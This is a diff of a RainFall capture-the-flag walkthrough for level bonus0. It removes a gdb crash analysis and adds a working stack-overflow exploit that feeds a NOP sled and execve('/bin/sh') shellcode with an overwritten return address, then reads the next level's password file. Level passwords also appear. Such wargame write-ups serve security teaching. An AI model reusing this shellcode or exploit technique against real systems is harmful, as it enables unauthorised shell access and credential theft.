@@ -1,18 +1,3 @@
-level0@RainFall:~$ 
-su bonus0 
-f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
-
-gdb ./bonus0
-GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
-Copyright (C) 2012 Free Software Foundation, Inc.
-License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
-This is free software: you are free to change and redistribute it.
-There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
-and "show warranty" for details.
-This GDB was configured as "i686-linux-gnu".
-For bug reporting instructions, please see:
-<http://bugs.launchpad.net/gdb-linaro/>...
-Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
 (gdb) disas main
 Dump of assembler code for function main:
    0x080485a4 <+0>:	push   %ebp
@@ -29,67 +14,11 @@ Dump of assembler code for function main:
    0x080485ca <+38>:	leave  
    0x080485cb <+39>:	ret    
 End of assembler dump.
-(gdb) run
-Starting program: /home/user/bonus0/bonus0 
- - 
-7846213986666666666666421111111111111111111111111111111
-7844451121954535613278462139866666666666��� 78462139866666666666���
+(gdb) 
 
-Program received signal SIGSEGV, Segmentation fault.
-0x36363636 in ?? ()
 
-(gdb) info registers
-eax            0x0	0
-ecx            0xffffffff	-1
-edx            0xb7fd28b8	-1208145736
-ebx            0xb7fd0ff4	-1208152076
-esp            0xbffff730	0xbffff730
-ebp            0x38393331	0x38393331
-esi            0x0	0
-edi            0x0	0
-eip            0x36363636	0x36363636
-eflags         0x210282	[ SF IF RF ID ]
-cs             0x73	115
-ss             0x7b	123
-ds             0x7b	123
-es             0x7b	123
-fs             0x0	0
-gs             0x33	51
-(gdb) x/20x $esp
-0xbffff730:	0x36363636	0xf4363636	0x00b7fd0f	0xb7fdc858
-0xbffff740:	0x00000000	0xbffff71c	0xbffff7cc	0x00000000
-0xbffff750:	0x0804824c	0xb7fd0ff4	0x00000000	0x00000000
-0xbffff760:	0x00000000	0x361e3474	0x01597064	0x00000000
-0xbffff770:	0x00000000	0x00000000	0x00000001	0x08048400
-(gdb) q
-bonus0@RainFall:~$ cat > /tmp/getenv.c // create 
-
-vim  /tmp/getenv.c  
-#include <stdio.h>
-#include <stdlib.h>
-
-int main(int argc, char **argv)
-{
-    printf("%p\n", getenv(argv[1]));
-}
-vim  /tmp/getenv.c 
-
-gcc /tmp/getenv.c -o /tmp/getenv
-cat /tmp/payload - | ./bonus0
+bonus0@RainFall:~$ (python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'; python -c 'print "A" * 9 + "\xd0\xe6\xff\xbf" + "B" * 7'; cat) | ./bonus0
  - 
  - 
-AAAAAAAAAAAAAAAAAAAABBBBBBBBB��� BBBBBBBBB���
-
-bonus0@RainFall:
-(python -c "
-
-import struct
-
-addr = struct.pack('<I', 0xbffff8a6)  
-
-print 'A'*4095 + '\n' + 'Aa0Aa1Aa2' + addr + 'B'*10
-
-"; cat) | ./bonus0
-
+��������������������AAAAAAAAA����BBBBBBB��� AAAAAAAAA����BBBBBBB���
 cat /home/user/bonus1/.pass
-cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
